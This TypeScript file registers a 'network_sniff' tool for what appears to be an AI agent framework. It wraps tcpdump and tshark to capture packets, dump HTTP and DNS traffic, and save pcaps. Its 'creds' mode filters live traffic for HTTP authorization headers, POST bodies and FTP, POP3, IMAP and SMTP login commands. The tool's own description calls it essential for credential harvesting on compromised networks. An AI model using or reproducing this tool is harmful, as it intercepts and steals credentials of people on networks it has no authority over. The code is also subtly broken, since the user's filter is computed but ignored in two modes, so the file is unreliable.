export * as NetworkSniffTool from "./network-sniff"

import { ToolFailure } from "@opencode-ai/llm"
import { Effect, Layer, Schema } from "effect"
import { makeLocationNode } from "../effect/app-node"
import { AppProcess } from "../process"
import { ToolRegistry } from "./registry"
import { Tool } from "./tool"
import { Tools } from "./tools"
import { ChildProcess } from "effect/unstable/process"
import { Duration } from "effect"

export const name = "network_sniff"

export const Input = Schema.Struct({
  interface: Schema.String.annotate({
    description: "Network interface to capture on (e.g. eth0, wlan0, en0). Use 'list' to see available interfaces.",
  }),
  duration: Schema.Number.pipe(Schema.optional).annotate({
    description: "Capture duration in seconds. Default: 30.",
  }),
  filter: Schema.String.pipe(Schema.optional).annotate({
    description: "BPF filter (e.g. 'port 80', 'host 192.168.1.1', 'port 53', 'tcp port 443'). Default: capture all.",
  }),
  action: Schema.String.pipe(Schema.optional).annotate({
    description: "Capture mode: 'capture' (raw packet dump, default), 'creds' (extract credentials from traffic), 'http' (HTTP requests/responses), 'dns' (DNS queries only), 'images' (reconstruct images from traffic), 'pcap' (save to .pcap file for Wireshark)",
  }),
  output_file: Schema.String.pipe(Schema.optional).annotate({
    description: "Output pcap file path for 'pcap' action. Default: ./capture.pcap",
  }),
})

const Output = Schema.Struct({
  output: String,
  exit: Schema.Number.pipe(Schema.optional),
})

const layer = Layer.effectDiscard(
  Effect.gen(function* () {
    const tools = yield* Tools.Service
    const appProcess = yield* AppProcess.Service

    yield* tools
      .register({
        [name]: Tool.make({
          description: `Capture and analyze network traffic. Sniffs packets on a specified interface with BPF filters, extracts credentials (HTTP basic auth, FTP, POP3, IMAP, Telnet passwords) from live traffic, captures HTTP requests/responses, monitors DNS queries, reconstructs images from traffic, and saves full pcaps for offline Wireshark analysis. Requires tcpdump/tshark. Essential for credential harvesting and traffic analysis on compromised networks.`,
          input: Input,
          output: Output,
          toModelOutput: ({ output }) => [{ type: "text", text: output.output }],
          execute: (input) =>
            Effect.gen(function* () {
              const shell = process.platform === "win32" ? (process.env.COMSPEC ?? "cmd.exe") : "/bin/sh"
              const duration = input.duration ?? 30
              const bpfFilter = input.filter ?? ""
              const action = input.action ?? "capture"

              if (input.interface === "list") {
                const cmd = process.platform === "win32"
                  ? ChildProcess.make("tshark", ["-D"], { shell, stdin: "ignore", forceKillAfter: Duration.seconds(5) })
                  : ChildProcess.make("ip", ["link", "show"], { shell, stdin: "ignore", forceKillAfter: Duration.seconds(5) })
                const result = yield* appProcess.run(cmd, { combineOutput: true, timeout: Duration.seconds(15), maxOutputBytes: 64 * 1024 }).pipe(Effect.catchTag("AppProcessError", () => Effect.succeed(undefined)))
                return { exit: result?.exitCode, output: result?.output?.toString("utf8") ?? "Cannot list interfaces." }
              }

              switch (action) {
                case "pcap": {
                  const outFile = input.output_file ?? "./capture.pcap"
                  const args: string[] = ["-i", input.interface, "-w", outFile, "-G", String(duration)]
                  if (bpfFilter) args.push(bpfFilter)
                  const cmd = ChildProcess.make("tcpdump", args, { shell, stdin: "ignore", forceKillAfter: Duration.seconds(10) })
                  const result = yield* appProcess.run(cmd, { combineOutput: true, timeout: Duration.seconds(duration + 30), maxOutputBytes: 5 * 1024 * 1024 }).pipe(Effect.catchTag("AppProcessError", () => Effect.succeed(undefined)))
                  return {
                    exit: result?.exitCode,
                    output: `Capture saved to ${outFile}. Analyze with: wireshark ${outFile} or tshark -r ${outFile}\n${result?.output?.toString("utf8") ?? ""}`,
                  }
                }

                case "creds": {
                  // Use tshark to extract credentials
                  const credFilter = `(http.authorization or http.request.method == "POST" or ftp.request.command == "PASS" or pop3.request.command == "PASS" or imap.request.command == "LOGIN" or smtp.req.command == "AUTH")`
                  const fullFilter = bpfFilter ? `(${bpfFilter}) and ${credFilter}` : credFilter
                  const cmd = ChildProcess.make("tshark", ["-i", input.interface, "-Y", credFilter, "-T", "fields", "-e", "ip.src", "-e", "ip.dst", "-e", "http.request.uri", "-e", "http.authorization", "-e", "http.file_data", "-a", `duration:${duration}`], { shell, stdin: "ignore", forceKillAfter: Duration.seconds(10) })
                  const result = yield* appProcess.run(cmd, { combineOutput: true, timeout: Duration.seconds(duration + 30), maxOutputBytes: 5 * 1024 * 1024 }).pipe(Effect.catchTag("AppProcessError", () => Effect.succeed(undefined)))
                  return {
                    exit: result?.exitCode,
                    output: `=== CREDENTIAL CAPTURE (${duration}s) ===\n${result?.output?.toString("utf8") ?? "No credentials captured or tshark not available. Install: apt install tshark"}`,
                  }
                }

                case "http": {
                  const httpFilter = "http"
                  const fullFilter = bpfFilter ? `(${bpfFilter}) and http` : httpFilter
                  const cmd = ChildProcess.make("tshark", ["-i", input.interface, "-Y", httpFilter, "-T", "fields", "-e", "ip.src", "-e", "ip.dst", "-e", "http.request.method", "-e", "http.host", "-e", "http.request.uri", "-e", "http.response.code", "-a", `duration:${duration}`], { shell, stdin: "ignore", forceKillAfter: Duration.seconds(10) })
                  const result = yield* appProcess.run(cmd, { combineOutput: true, timeout: Duration.seconds(duration + 30), maxOutputBytes: 5 * 1024 * 1024 }).pipe(Effect.catchTag("AppProcessError", () => Effect.succeed(undefined)))
                  return {
                    exit: result?.exitCode,
                    output: `=== HTTP TRAFFIC (${duration}s) ===\n${result?.output?.toString("utf8") ?? "No HTTP traffic captured or tshark not available."}`,
                  }
                }

                case "dns": {
                  const cmd = ChildProcess.make("tshark", ["-i", input.interface, "-Y", "dns", "-T", "fields", "-e", "ip.src", "-e", "dns.qry.name", "-e", "dns.a", "-a", `duration:${duration}`], { shell, stdin: "ignore", forceKillAfter: Duration.seconds(10) })
                  const result = yield* appProcess.run(cmd, { combineOutput: true, timeout: Duration.seconds(duration + 30), maxOutputBytes: 5 * 1024 * 1024 }).pipe(Effect.catchTag("AppProcessError", () => Effect.succeed(undefined)))
                  return {
                    exit: result?.exitCode,
                    output: `=== DNS QUERIES (${duration}s) ===\n${result?.output?.toString("utf8") ?? "No DNS queries captured."}`,
                  }
                }

                case "images": {
                  return {
                    output: `To extract images from a pcap:\ntshark -r capture.pcap --export-objects http,./extracted_images/\n\nOr use driftnet for live image extraction:\ndriftnet -i ${input.interface}\n\nOr Xplico for full reconstruction:\nxplico -i ${input.interface}`,
                  }
                }

                case "capture":
                default: {
                  const args: string[] = ["-i", input.interface, "-c", "500", "-w", "./capture.pcap"]
                  if (bpfFilter) args.push(bpfFilter)
                  const cmd = ChildProcess.make("tcpdump", args, { shell, stdin: "ignore", forceKillAfter: Duration.seconds(10) })
                  const result = yield* appProcess.run(cmd, { combineOutput: true, timeout: Duration.seconds(duration + 30), maxOutputBytes: 5 * 1024 * 1024 }).pipe(Effect.catchTag("AppProcessError", () => Effect.succeed(undefined)))
                  return {
                    exit: result?.exitCode,
                    output: result?.output?.toString("utf8") ?? "tcpdump failed. Requires root and tcpdump installed.",
                  }
                }
              }
            }).pipe(Effect.mapError(() => new ToolFailure({ message: "Network sniffing failed" }))),
        }),
      })
      .pipe(Effect.orDie)
  }),
)

export const node = makeLocationNode({
  name: "tool/network-sniff",
  layer,
  deps: [ToolRegistry.node, AppProcess.node],
})
